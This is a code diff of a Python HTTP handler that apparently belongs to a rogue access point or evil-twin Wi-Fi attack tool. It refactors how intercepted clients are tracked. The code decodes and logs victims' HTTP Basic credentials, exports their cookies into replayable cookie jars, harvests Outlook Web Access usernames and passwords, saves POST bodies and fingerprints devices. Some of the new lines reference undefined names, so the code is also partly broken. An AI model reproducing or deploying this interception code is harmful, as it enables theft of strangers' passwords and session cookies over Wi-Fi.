@@ -80,8 +80,12 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       ])
 
   def do_GET(self):
-    client = self.client_address[0]
-    client_mac = self.server.app.get_client_bssid(client)
+    ip = self.client_address[0]
+    client = self.server.app.get_client_from_ip(ip)
+    # do not fake unknown clients
+    if client is None:
+      return
+    
     path,params,args = self._parse_url()
     host = self.headers.get('Host')
     if host is None:
@@ -98,7 +102,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       protocol = ctxt(self.server.PRE,RED)
     self.server.app.log( "%s %s GET: %s => %s"%(essid,protocol,client,fullpath) )
 
-    self.server.app.guessr.feed_http_request(client_mac, self.server.PRE, path, params, self.headers)
+    self.server.app.guessr.feed_http_request(client, self.server.PRE, path, params, self.headers)
 
     if len(self.headers) > 0:
       self.server.app.log( ctxt(" /headers", BLUE))
@@ -136,26 +140,25 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       if haparams[0] == 'Basic':
         self.server.app.log( "%s HTTP Basic authorization from %s to host %s: %s"%(
           ctxt('[*]',YELLOW),
-          client,
+          client.bssid,
           host,
           ctxt(base64.decodestring(haparams[1]), YELLOW)))
       else:
         self.server.app.log( "%s HTTP %s authorization from %s to host %s: %s"%(
           ctxt('[*]',YELLOW),
           haparams[0],
-          client,
+          client.bssid,
           host,
           http_auth))
         
     if 'cookie' in self.headers:
-        self.register_cookie(client_mac, client, host)
         ckdata = self.headers['Cookie']
         
         # use a Cookie.SimpleCookie to deserialize data
         ck = Cookie.SimpleCookie()
         ck.load(ckdata)
         # create a cookie jar to export data
-        name = os.path.join(self.server.app.logpath, '%s_%s.cookie.txt'%(client_mac,host))
+        name = os.path.join(self.server.app.logpath, '%s_%s.cookie.txt'%(client.bssid,host))
         cjar = cookielib.MozillaCookieJar(name)
         for k,v in ck.items():
           cjar.set_cookie(cookielib.Cookie(1,
@@ -169,6 +172,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             "",
             False))
         cjar.save()
+        client.register_cookie(host,name)
 
      # catch cookie request now
     if path.endswith('leaking_cookies'):
@@ -314,28 +318,26 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       faked = False
 
     uri = "%s://%s"%(self.server.PRE.lower(),fullpath)
-    self.server.app.db.new_service_request(
-      client_mac, 'HTTP', 'GET', uri, '', self.headers_to_text(), faked)
+    client.register_service_request(self.server.PRE, 'POST', uri, post, self.headers_to_text(), False)
 
   def do_POST(self):
-    client = self.client_address[0]
-    client_mac = self.server.app.get_client_bssid(client)
+    ip = self.client_address[0]
+    client = self.server.app.get_client_from_ip(ip)
+    # do not fake unknown clients
+    if client is None:
+      return
     path,params,args = self._parse_url()
     host = self.headers.get('Host')
     fullpath =  "%s/%s"%(host,path)
     
-    essid = ""
-    try:
-      essid = self.server.app.get_client_ap(client).get_essid()
-    except:
-      pass
+    essid = client.vif.essid
 
-    self.server.app.guessr.feed_http_request(client_mac, self.server.PRE, self.path, params, self.headers)
+    self.server.app.guessr.feed_http_request(client, self.server.PRE, self.path, params, self.headers)
 
     protocol = ctxt(self.server.PRE,BLUE)
     if self.server.PRE == 'HTTPS':
       protocol = ctxt(self.server.PRE,RED)
-    self.server.app.log( "%s %s POST: %s => %s"%(essid,protocol,client,fullpath) )
+    self.server.app.log( "%s %s POST: %s => %s"%(essid,protocol,client.bssid,fullpath) )
     for k in self.headers:
       self.server.app.log( "%s> %s:%s"%(ctxt(" |\\--",BLUE),k,self.headers.get(k)) )
     
@@ -346,7 +348,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           user_password = base64.b64decode(authorization[1])
           login,password = user_password.split(':')
           user = {'uri':fullpath,'login': login,  'password':password}
-          self.server.app.log_login(client, user)
+          c.log_login(user)
     except Exception as e:
       print e
     
@@ -362,7 +364,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         operator = self.headers.get('operator')
         brand = self.headers.get('brand')
         country = self.headers.get('country')
-        self.server.app.log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))
+        self.server.app.log( "%s is using a %s %s using %s. Language is %s"%(client.bssid, brand, model, operator, lang))
 
       elif path == 'owa/auth.owa':
         
@@ -371,39 +373,29 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
           user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
-          self.server.app.log_login(client, user)
+          c.log_login(user)
         except:
           raise
             
       #save content
       if length > 0:
-        bssid = self.server.app.get_client_bssid(client)
+        bssid = client.bssid
         name = os.path.join(self.server.app.logpath,"%s_%s_%d"%(bssid,host,1000*time.time()))
-        self.register_post(bssid, name)
+        client.register_post(fullpath,name)
         f = open(name,'w')
         f.write(post)
         f.close()
-        self.server.app.log( "[+] %s from %s to %s (%s)"%(ctxt("saved post request",GREEN), client, fullpath, name))
+        self.server.app.log( "[+] %s from %s to %s (%s)"%(ctxt("saved post request",GREEN), client.bssid, fullpath, name))
     
     if path == 'gen_204':
       self.send_response(204)
     else:
       self.send_response(200)
       
-    client_mac = self.server.app.get_client_bssid(client)
     uri = "%s://%s"%(self.server.PRE.lower(),fullpath)
-    self.server.app.db.new_service_request(
-      client_mac, 'HTTP', 'POST', uri, post, self.headers_to_text(), False)
+    client.register_service_request(self.server.PRE, 'POST', uri, post, self.headers_to_text(), False)
 
     self.end_headers()
     
-  def register_cookie(self,bssid, ip, host):
-    ap = self.server.app.get_client_ap(ip)
-    if ap is not None:
-      if not host in ap.clients[bssid]['cookies']:
-        ap.clients[bssid]['cookies'].append(host)
-      
-  def register_post(self, bssid, name):
-    ap = self.server.app.get_client_ap(bssid)
-    if ap is not None:
-      ap.clients[bssid]['post'].append(name)
+    if host == "api.deezer.com" and path == "1.0/gateway.php":
+      deezer = json.loads(post)
